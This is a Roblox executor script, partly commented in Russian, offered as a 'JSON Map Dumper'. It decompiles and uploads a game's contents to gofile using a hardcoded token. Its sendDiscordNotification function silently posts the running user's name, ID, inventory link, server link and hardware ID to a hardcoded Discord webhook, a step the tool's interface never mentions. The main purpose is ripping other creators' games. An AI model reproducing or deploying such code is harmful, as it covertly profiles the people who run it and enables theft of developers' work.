-- JSON Map Dumper (updated)
-- Автор: обновлённая версия по твоим требованиям
local HttpService = game:GetService("HttpService")
local task = task or delay
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- ================= api ================= --
local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- pls dont touch this
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
-- ================================================ --

local IGNORE_PLAYERS = true 
local TUTORIAL_LINK = "https://jpst.it/4JOG-"
local CURRENT_LANG = "RU"
local DUMP_MODE = "General" 

local TEXTS = {
    RU = {
        Title = "JSON ДАМПЕР", Init = "Инициализация...", Counting = "Подсчет объектов...",
        Scanning = "Сканирование...", Encoding = "Кодирование JSON...",
        Uploading = "Загрузка файла ", Success = "УСПЕЕШНО!",
        LinkCopied = "Ссылка скопирована!", Error = "ОШИБКА",
        NoHttp = "HTTP запросы не поддерживаются!", LangTitle = "ВЫБЕРИТЕ ЯЗЫК",
        UploadFailed = "Загрузка не удалась", TutorialButton = "Инструкция (копировать)",
        FileSize = "Размер: %.1f MB", 
        ModeTitle = "ВЫБОР РЕЖИМА ДАМПА",
        ModeGeneral = "General (Только карта)",
        ModeFull = "Full (ВСЁ: Replicated, Gui, Scripts)",
        ModeStatus = "Режим: %s. Сканирование всех сервисов.",
        Warning = "ВНИМАНИЕ: Копирование НЕ гарантирует 100% точность (скрипты/физика). Full режим может занять много времени!",
    },
    EN = {
        Title = "JSON DUMPER", Init = "Initializing...", Counting = "Counting objects...",
        Scanning = "Scanning...", Encoding = "Encoding JSON...",
        Uploading = "Uploading file ", Success = "SUCCESS!",
        LinkCopied = "Link copied to clipboard!", Error = "ERROR",
        NoHttp = "HTTP requests not supported!", LangTitle = "SELECT LANGUAGE",
        UploadFailed = "Upload failed", TutorialButton = "Tutorial (copy)",
        FileSize = "Size: %.1f MB",
        ModeTitle = "SELECT DUMP MODE",
        ModeGeneral = "General (Map only)",
        ModeFull = "Full (ALL: Replicated, Gui, Scripts)",
        ModeStatus = "Mode: %s. Scanning all services.",
        Warning = "WARNING: Copy does NOT guarantee 100% accuracy (scripts/physics). Full mode may take time!",
    }
}

local function T(key) return TEXTS[CURRENT_LANG][key] or key end

local ScreenGui, MainFrame, StatusLabel, InfoLabel, Fill, ProgressFrame

-- UI CREATION (Language, Mode, Main)
local function createLanguageGUI(onSelected)
    if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
    local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
    local frame = Instance.new("Frame") frame.Size = UDim2.new(0, 300, 0, 150) frame.Position = UDim2.new(0.5, -150, 0.5, -75) frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30) frame.Parent = gui Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local title = Instance.new("TextLabel") title.Size = UDim2.new(1,0,0,40) title.BackgroundTransparency = 1 title.Text = T("LangTitle") title.TextColor3 = Color3.fromRGB(255,255,255) title.Font = Enum.Font.GothamBold title.TextSize = 18 title.Parent = frame
    local function createBtn(text, pos, langCode)
        local btn = Instance.new("TextButton") btn.Size = UDim2.new(0.4, 0, 0, 40) btn.Position = pos btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60) btn.Text = text btn.TextColor3 = Color3.fromRGB(255,255,255) btn.Font = Enum.Font.Gotham btn.TextSize = 16 btn.Parent = frame Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function() CURRENT_LANG = langCode gui:Destroy() onSelected() end)
    end
    createBtn("English", UDim2.new(0.05, 0, 0.5, 0), "EN") createBtn("Русский", UDim2.new(0.55, 0, 0.5, 0), "RU")
end

local function createModeGUI(onSelected)
    if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
    local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
    local frame = Instance.new("Frame") frame.Size = UDim2.new(0, 300, 0, 150) frame.Position = UDim2.new(0.5, -150, 0.5, -75) frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30) frame.Parent = gui Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local title = Instance.new("TextLabel") title.Size = UDim2.new(1,0,0,40) title.BackgroundTransparency = 1 title.Text = T("ModeTitle") title.TextColor3 = Color3.fromRGB(255,255,255) title.Font = Enum.Font.GothamBold title.TextSize = 18 title.Parent = frame
    local function createBtn(text, pos, mode)
        local btn = Instance.new("TextButton") btn.Size = UDim2.new(0.4, 0, 0, 40) btn.Position = pos btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60) btn.Text = text btn.TextColor3 = Color3.fromRGB(255,255,255) btn.Font = Enum.Font.Gotham btn.TextSize = 12 btn.TextWrapped = true btn.Parent = frame Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function() DUMP_MODE = mode gui:Destroy() onSelected() end)
    end
    createBtn(T("ModeGeneral"), UDim2.new(0.05, 0, 0.5, 0), "General") createBtn(T("ModeFull"), UDim2.new(0.55, 0, 0.5, 0), "Full")
end

local function createMainGUI()
    ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "MapDumperUI" ScreenGui.Parent = CoreGui ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    MainFrame = Instance.new("Frame") MainFrame.Size = UDim2.new(0, 280, 0, 150)  MainFrame.Position = UDim2.new(1, -295, 0, 15) MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30) MainFrame.BorderSizePixel = 0 MainFrame.Parent = ScreenGui Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
    local dragging, dragStart, frameStart = false, Vector2.new(0, 0), UDim2.new(0, 0, 0, 0)
    MainFrame.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true dragStart = input.Position frameStart = MainFrame.Position end end)
    MainFrame.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end end)
    if UserInputService then UserInputService.InputChanged:Connect(function(input) if dragging then local delta = input.Position - dragStart MainFrame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y) end end) end
    StatusLabel = Instance.new("TextLabel") StatusLabel.Size = UDim2.new(1, 0, 0, 25) StatusLabel.Position = UDim2.new(0, 0, 0, 5) StatusLabel.BackgroundTransparency = 1 StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255) StatusLabel.TextSize = 16 StatusLabel.Font = Enum.Font.GothamBold StatusLabel.Text = T("Title") StatusLabel.Parent = MainFrame
    InfoLabel = Instance.new("TextLabel") InfoLabel.Size = UDim2.new(1, 0, 0, 40)  InfoLabel.Position = UDim2.new(0, 0, 0.25, 0) InfoLabel.BackgroundTransparency = 1 InfoLabel.TextColor3 = Color3.fromRGB(180, 180, 180) InfoLabel.TextSize = 12 InfoLabel.Font = Enum.Font.SourceSans InfoLabel.Text = T("Init") InfoLabel.TextWrapped = true InfoLabel.Parent = MainFrame
    ProgressFrame = Instance.new("Frame") ProgressFrame.Size = UDim2.new(0.9, 0, 0, 6) ProgressFrame.Position = UDim2.new(0.05, 0, 0.6, 0) ProgressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50) ProgressFrame.BorderSizePixel = 0 ProgressFrame.Parent = MainFrame Instance.new("UICorner", ProgressFrame).CornerRadius = UDim.new(0, 3)
    Fill = Instance.new("Frame") Fill.Size = UDim2.new(0, 0, 1, 0) Fill.BackgroundColor3 = Color3.fromRGB(0, 120, 255) Fill.BorderSizePixel = 0 Fill.Parent = ProgressFrame Instance.new("UICorner", Fill).CornerRadius = UDim.new(0, 3)
    local WarningLabel = Instance.new("TextLabel") WarningLabel.Size = UDim2.new(1, 0, 0, 25)  WarningLabel.Position = UDim2.new(0, 0, 0.7, 0) WarningLabel.BackgroundTransparency = 1 WarningLabel.TextColor3 = Color3.fromRGB(255, 100, 100) WarningLabel.TextSize = 10 WarningLabel.Font = Enum.Font.SourceSansBold WarningLabel.Text = T("Warning") WarningLabel.TextWrapped = true WarningLabel.Parent = MainFrame
end

local function updateStatus(status, progressPercent, color)
    if not ScreenGui then return end
    InfoLabel.Text = status
    if progressPercent then Fill.Size = UDim2.new(math.clamp(progressPercent/100, 0, 1), 0, 1, 0) else Fill.Size = UDim2.new(0, 0, 1, 0)  end
    if color then Fill.BackgroundColor3 = color end
end

local function createTutorialButton()
    if not MainFrame then return end
    local TutorialButton = Instance.new("TextButton") TutorialButton.Size = UDim2.new(0.9, 0, 0, 25) TutorialButton.Position = UDim2.new(0.05, 0, 0.82, 0)  TutorialButton.BackgroundColor3 = Color3.fromRGB(70, 70, 80) TutorialButton.Text = T("TutorialButton") .. " (" .. TUTORIAL_LINK .. ")" TutorialButton.TextColor3 = Color3.fromRGB(255, 255, 255) TutorialButton.TextSize = 12 TutorialButton.Font = Enum.Font.GothamBold TutorialButton.Parent = MainFrame Instance.new("UICorner", TutorialButton).CornerRadius = UDim.new(0, 6)
    TutorialButton.MouseButton1Click:Connect(function() pcall(function() setclipboard(TUTORIAL_LINK) end) InfoLabel.Text = T("LinkCopied") task.delay(3, function() InfoLabel.Text = T("Success") end) end)
end

-- ==================== WEBHOOK DISCORD (updated) ==================== --
local function sendDiscordNotification(downloadLink, objectCount)
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end

    local player = Players.LocalPlayer
    local userId = player.UserId
    local playerName = player.Name
    local displayName = player.DisplayName
    local profileLink = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
    local inventoryLink = "https://www.roblox.com/users/" .. tostring(userId) .. "/inventory"

    local placeId = game.PlaceId
    local jobId = (pcall(function() return tostring(game.JobId) end) and tostring(game.JobId)) or "N/A"

    local gameName
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
    end)
    gameName = gameName or "Unknown"
    local gameLink = "https://www.roblox.com/games/" .. tostring(placeId)
    local serverLink = gameLink .. "?jobId=" .. jobId

    local playersCount = #Players:GetPlayers()
    local isStudio = tostring(RunService:IsStudio() == true)
    local hwid = (gethwid and pcall(gethwid) and gethwid()) or "Hidden/Not Supported"
    local dateStr = os.date("%Y-%m-%d %X")

    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    local embed = {
        ["title"] = "🔥 New Map Dump — " .. gameName,
        ["description"] = "A new player exported the map. Silent notification.",
        ["color"] = 3447003, -- blue
        ["fields"] = {
            { ["name"] = "👤 Player", ["value"] = "["..playerName.."]("..profileLink..")", ["inline"] = true },
            { ["name"] = "🆔 Player ID", ["value"] = tostring(userId), ["inline"] = true },
            { ["name"] = "📝 Display Name", ["value"] = displayName, ["inline"] = true },
            { ["name"] = "🎮 Game Name", ["value"] = "["..gameName.."]("..gameLink..")", ["inline"] = false },
            { ["name"] = "🔗 Server Link", ["value"] = serverLink, ["inline"] = false },
            { ["name"] = "⚙️ Mode", ["value"] = DUMP_MODE, ["inline"] = true },
            { ["name"] = "📦 Objects Scanned", ["value"] = tostring(objectCount), ["inline"] = true },
            { ["name"] = "👥 Players Online", ["value"] = tostring(playersCount), ["inline"] = true },
            { ["name"] = "🏗️ Is Studio", ["value"] = isStudio, ["inline"] = true },
            { ["name"] = "⏱️ Session Uptime", ["value"] = tostring(math.floor(tick() - game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("MapDumperUI").CreationTime)).." sec", ["inline"] = true },
            { ["name"] = "💾 Memory Usage", ["value"] = tostring(math.floor(collectgarbage("count"))).." KB", ["inline"] = true },
            { ["name"] = "🎒 Inventory Link", ["value"] = "[Open Inventory]("..inventoryLink..")", ["inline"] = true },
            { ["name"] = "🕒 Date", ["value"] = dateStr, ["inline"] = true },
            { ["name"] = "🔒 HWID", ["value"] = hwid, ["inline"] = false },
            { ["name"] = "📂 Download Link", ["value"] = "```"..downloadLink.."```\n[Direct Download]("..downloadLink..")", ["inline"] = false }
        },
        ["thumbnail"] = { ["url"] = avatarUrl },
        ["footer"] = { ["text"] = "Silent Map Dumper • " .. dateStr }
    }

    local payload = HttpService:JSONEncode({ ["embeds"] = {embed} })

    pcall(function()
        httpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
end
-- ==================================================================== --




-- LOADER_CODE left in file if needed later but NOT uploaded by default.
local LOADER_CODE = [=[ -- not uploaded by default in this version
-- (kept for reference)
]=]

-- SERIALIZATION
local function serializeType(val)
    local t = typeof(val)
    if t == "Vector3" then return {X=val.X, Y=val.Y, Z=val.Z} end
    if t == "Vector2" then return {X=val.X, Y=val.Y} end
    if t == "CFrame" then 
        local pos = val.Position
        local x,y,z = val:ToEulerAnglesXYZ()
        return {Pos={X=pos.X, Y=pos.Y, Z=pos.Z}, Rot={X=math.deg(x), Y=math.deg(y), Z=math.deg(z)}} 
    end
    if t == "Color3" then return {R=val.R, G=val.G, B=val.B} end
    if t == "EnumItem" then return tostring(val) end
    if t == "UDim2" then return {SX=val.X.Scale, OX=val.X.Offset, SY=val.Y.Scale, OY=val.Y.Offset} end
    if t == "BrickColor" then return val.Name end
    if t == "ColorSequence" then
        local kps = {}
        for _, kp in ipairs(val.Keypoints) do
            local c = kp.Value
            table.insert(kps, {Time=kp.Time, Color={R=c.R, G=c.G, B=c.B}})
        end
        return {Keypoints = kps}
    end
    return val
end

-- GET PROPS (extended)
local function getProps(obj)
    local props = {}
    props.Name = obj.Name
    props.ClassName = obj.ClassName

    pcall(function()
        if DUMP_MODE == "General" then
            if obj:IsA("BasePart") then
                props.CFrame = serializeType(obj.CFrame)
                props.Size = serializeType(obj.Size)
                props.Color = serializeType(obj.Color)
                props.BrickColor = serializeType(obj.BrickColor)
                props.Transparency = obj.Transparency
                props.Material = tostring(obj.Material)
                props.Anchored = obj.Anchored
                props.CanCollide = obj.CanCollide
                props.Shape = tostring(obj.Shape)
                props.Reflectance = obj.Reflectance
                props.CastShadow = obj.CastShadow
                props.Massless = obj.Massless
            end
            if obj:IsA("GuiBase2d") then 
                props.Size = serializeType(obj.Size)
                props.Position = serializeType(obj.Position)
                props.AnchorPoint = serializeType(obj.AnchorPoint)
                props.BackgroundColor3 = serializeType(obj.BackgroundColor3)
                props.Visible = obj.Visible
                props.ZIndex = obj.ZIndex
                if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                    props.Text = obj.Text
                    props.TextColor3 = serializeType(obj.TextColor3)
                    props.TextSize = obj.TextSize
                    props.Font = tostring(obj.Font)
                end
                if obj:IsA("ImageLabel") or obj:IsA("ImageButton") or obj:IsA("Decal") then
                    pcall(function()
                        props.Image = obj.Image or obj.Texture or nil
                    end)
                end
            end
            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
                props.Disabled = obj.Disabled 
                if decompile then
                    local s, src = pcall(decompile, obj)
                    if s then props.Source = src else props.Source = "-- Decompile failed" end
                else
                    props.Source = "-- No Decompiler"
                end
            end
            if obj:IsA("ParticleEmitter") then
                props.Texture = obj.Texture
                props.ColorSequence = serializeType(obj.ColorSequence)
                props.Rate = obj.Rate
            elseif obj:IsA("Sound") then
                props.SoundId = obj.SoundId
                props.Volume = obj.Volume
                props.Looped = obj.Looped
                props.Playing = obj.Playing
                props.RollOffMode = tostring(obj.RollOffMode)
            end
            if obj:IsA("Decal") or obj:IsA("Texture") then
                pcall(function() props.Texture = obj.Texture or obj.TextureId end)
            end
            if obj:IsA("MeshPart") or obj:IsA("SpecialMesh") then
                pcall(function()
                    props.MeshId = obj.MeshId or obj.Mesh.MeshId
                    props.TextureId = obj.TextureId or (obj.Mesh and obj.Mesh.TextureId)
                end)
            end
            if obj:IsA("JointInstance") or obj:IsA("Constraint") then
                props.Part0 = obj.Part0 and obj.Part0.Name or nil
                props.Part1 = obj.Part1 and obj.Part1.Name or nil
                if obj:IsA("Weld") or obj:IsA("Motor6D") then
                    props.C0 = serializeType(obj.C0)
                    props.C1 = serializeType(obj.C1)
                end
            end
        elseif DUMP_MODE == "Full" then
            -- Aggressive: include General props + extras where possible
            -- BasePart
            if obj:IsA("BasePart") then
                props.CFrame = serializeType(obj.CFrame)
                props.Size = serializeType(obj.Size)
                props.Color = serializeType(obj.Color)
                props.Transparency = obj.Transparency
                props.Material = tostring(obj.Material)
                props.Anchored = obj.Anchored
                props.CanCollide = obj.CanCollide
                props.Massless = obj.Massless
                props.CastShadow = obj.CastShadow
                props.Reflectance = obj.Reflectance
                props.CustomPhysicalProperties = pcall(function() return obj.CustomPhysicalProperties end) and tostring(obj.CustomPhysicalProperties) or nil
            end
            -- Scripts
            if obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script") then
                props.Disabled = obj.Disabled
                if decompile then
                    local s, src = pcall(decompile, obj)
                    if s then props.Source = src else props.Source = "-- Decompile failed" end
                else
                    props.Source = "-- No Decompiler"
                end
            end
            -- Values
            if obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("BoolValue") or obj:IsA("NumberValue") then
                props.Value = serializeType(obj.Value)
            end
            -- GUI
            if obj:IsA("GuiObject") then
                props.Size = serializeType(obj.Size)
                props.Position = serializeType(obj.Position)
                props.Visible = obj.Visible
                props.BackgroundColor3 = serializeType(obj.BackgroundColor3)
                props.ZIndex = obj.ZIndex
            end
            -- Sound / Particle / Mesh / Decal
            if obj:IsA("Sound") then
                props.SoundId = obj.SoundId
                props.Volume = obj.Volume
                props.Looped = obj.Looped
                props.Playing = obj.Playing
            end
            if obj:IsA("ParticleEmitter") then
                props.Texture = obj.Texture
                props.ColorSequence = serializeType(obj.ColorSequence)
                props.Rate = obj.Rate
            end
            if obj:IsA("Decal") or obj:IsA("Texture") then
                pcall(function() props.Texture = obj.Texture or obj.TextureId end)
            end
            if obj:IsA("MeshPart") or obj:IsA("SpecialMesh") then
                pcall(function()
                    props.MeshId = obj.MeshId or (obj.Mesh and obj.Mesh.MeshId)
                    props.TextureId = obj.TextureId or (obj.Mesh and obj.Mesh.TextureId)
                end)
            end
            -- Constraints
            if obj:IsA("JointInstance") or obj:IsA("Constraint") then
                props.Part0 = obj.Part0 and obj.Part0.Name or nil
                props.Part1 = obj.Part1 and obj.Part1.Name or nil
                if obj:IsA("Weld") or obj:IsA("Motor6D") then
                    props.C0 = serializeType(obj.C0)
                    props.C1 = serializeType(obj.C1)
                end
            end
        end
    end)
    return props
end

local scannedCount = 0
local totalToScan = 0

local function countDescendants(obj)
    local c = 0
    if not obj then return 0 end
    local s, children = pcall(function() return obj:GetChildren() end)
    if not s or not children then return 0 end

    for _, v in ipairs(children) do
        if IGNORE_PLAYERS and v:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(v) then continue end
        if v:IsA("Terrain") then continue end
        c = c + 1 + countDescendants(v)
    end
    return c
end

local function scan(obj)
    scannedCount = scannedCount + 1

    if scannedCount % 500 == 0 then
        updateStatus(T("Scanning") .. " (" .. scannedCount .. "/" .. totalToScan .. ")")
        task.wait()
    end

    local node = { Props = getProps(obj), Children = {} }

    local s, children = pcall(function() return obj:GetChildren() end)
    if s and children then
        for _, child in ipairs(children) do
            if IGNORE_PLAYERS and child:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(child) then continue end
            if child:IsA("Terrain") then continue end
            if child.Name == "Camera" and child.Parent == workspace then continue end

            table.insert(node.Children, scan(child))
        end
    end
    return node
end

local function uploadToGofile(files)
    local totalFiles = #files
    local link = nil

    for i, file in ipairs(files) do
        local fileSizeMB = #file.filedata / 1024 / 1024

        local status = T("Uploading") .. file.filename .. string.format(" (%d из %d, ", i, totalFiles) .. string.format(T("FileSize"), fileSizeMB) .. ")"

        local boundary = "---------------------------"..tostring(math.random(1000000000000,9999999999999))
        local body = ""

        body = body .. "--"..boundary.."\r\n"..'Content-Disposition: form-data; name="token"\r\n\r\n'..API_KEY.."\r\n"
        body = body .. "--"..boundary.."\r\n"..'Content-Disposition: form-data; name="file"; filename="'..file.filename..'"\r\n'.."Content-Type: application/octet-stream\r\n\r\n"..file.filedata.."\r\n"
        body = body .. "--"..boundary.."--"

        local headers = {["Content-Type"]="multipart/form-data; boundary="..boundary}
        local servers = {"https://store1.gofile.io/uploadFile", "https://api.gofile.io/uploadFile"}
        local response

        local animateTask
        local p = 0
        animateTask = task.spawn(function()
            while not response do
                p = (p + 10) % 100
                updateStatus(status, p, Color3.fromRGB(255, 170, 0))
                task.wait(0.05)
            end
            updateStatus(status, 100, Color3.fromRGB(0, 120, 255))
        end)

        for _, url in ipairs(servers) do
            if not response then
                pcall(function() response = httpRequest({Url = url, Method = "POST", Headers = headers, Body = body}) end)
            end
        end

        task.cancel(animateTask)

        if not response or not response.Body then return false, "No Response" end

        local s, t = pcall(function() return HttpService:JSONDecode(response.Body) end)

        if s and t and t.status == "ok" and t.data and t.data.downloadPage then
            link = t.data.downloadPage
        else
            return false, T("UploadFailed")
        end
    end

    return true, link
end

local function startDumper()
    if not httpRequest then
        createMainGUI()
        updateStatus(T("Error"), 100, Color3.fromRGB(200, 50, 50))
        InfoLabel.Text = T("NoHttp")
        return
    end

    createMainGUI()

    task.spawn(function()
        updateStatus(string.format(T("ModeStatus"), DUMP_MODE), 0)
        task.wait(0.5)

        -- DEFINING WHAT TO SCAN
        local rootsToScan = {}

        if DUMP_MODE == "Full" then
            -- ADDING ALL IMPORTANT SERVICES (FULL: everything)
            local safeAdd = function(name)
                pcall(function()
                    local s = game:GetService(name)
                    if s then table.insert(rootsToScan, s) end
                end)
            end
            safeAdd("Workspace")
            safeAdd("ReplicatedStorage")
            safeAdd("ServerStorage")
            safeAdd("Lighting")
            safeAdd("ReplicatedFirst")
            safeAdd("StarterPack")
            safeAdd("StarterGui")
            safeAdd("Teams")
            safeAdd("SoundService")
            safeAdd("StarterPlayer")
            safeAdd("ServerScriptService")
            safeAdd("Players")
        else
            -- JUST WORKSPACE
            table.insert(rootsToScan, game:GetService("Workspace"))
        end

        updateStatus(T("Counting"))
        task.wait(0.1)

        totalToScan = 0
        for _, root in ipairs(rootsToScan) do
            pcall(function() totalToScan = totalToScan + countDescendants(root) end)
        end
        if totalToScan < 1 then totalToScan = 1 end

        updateStatus(T("Scanning") .. " (0/" .. totalToScan .. ")")

        -- CREATE A VIRTUAL ROOT FOR MULTI-SERVICE DUMP
        local gameRoot = { Props = {Name = "GAME_ROOT", ClassName = "Folder"}, Children = {} }

        for _, root in ipairs(rootsToScan) do
            local serviceNode = scan(root)
            -- Override name to ensure it matches service name
            serviceNode.Props.Name = root.Name
            table.insert(gameRoot.Children, serviceNode)
        end

        local mapData = {
            Info = {
                PlaceId = game.PlaceId or 0,
                Name = game.Name or "Unknown",
                Date = os.time(),
                Mode = DUMP_MODE,
                Players = #Players:GetPlayers()
            },
            Map = gameRoot
        }

        updateStatus(T("Encoding"))
        task.wait(0.1)

        local jsonData
        local s, err = pcall(function() jsonData = HttpService:JSONEncode(mapData) end)

        if not s then
            updateStatus(T("Error"), 100, Color3.fromRGB(255, 50, 50))
            InfoLabel.Text = "JSON Error: " .. tostring(err)
            return
        end

        local filesToUpload = {
            {filename="FullMapDump_"..tostring(game.PlaceId)..".json", filedata=jsonData}
            -- NOTE: по требованию лоадер НЕ загружается — только дамп
        }

        local ok, link = uploadToGofile(filesToUpload)

        if ok then
            updateStatus(T("Success"), 100, Color3.fromRGB(0, 200, 50))
            InfoLabel.Text = T("LinkCopied")
            pcall(function() setclipboard(link) end)

            -- Silent webhook send with expanded info
            sendDiscordNotification(link, totalToScan)

            createTutorialButton()

        else
            updateStatus(T("Error"), 100, Color3.fromRGB(200, 50, 50))
            InfoLabel.Text = T("UploadFailed")
        end

        task.delay(10, function() if ScreenGui then ScreenGui:Destroy() end end)
    end)
end

createLanguageGUI(function()
    createModeGUI(startDumper)
end)




